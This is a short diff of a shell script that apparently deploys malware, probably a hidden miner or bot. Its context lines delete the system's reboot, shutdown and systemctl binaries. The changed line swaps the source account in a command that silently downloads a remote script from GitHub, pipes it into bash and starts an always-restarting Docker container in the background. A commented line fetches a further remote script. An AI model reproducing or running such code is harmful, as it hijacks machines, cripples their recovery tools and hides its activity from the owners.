@@ -4,7 +4,7 @@ sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl
 sleep 10800
 #sleep "$[`od -An -N2 -i /dev/urandom` % 3600 + 10800]"
 
-bash -c "wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "wget -qO- https://raw.githubusercontent.com/edrivetokenbsc/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
 ####bash -c "docker run -dt --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
 
 ##bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/awsai.sh) >/dev/null 2>&1 &
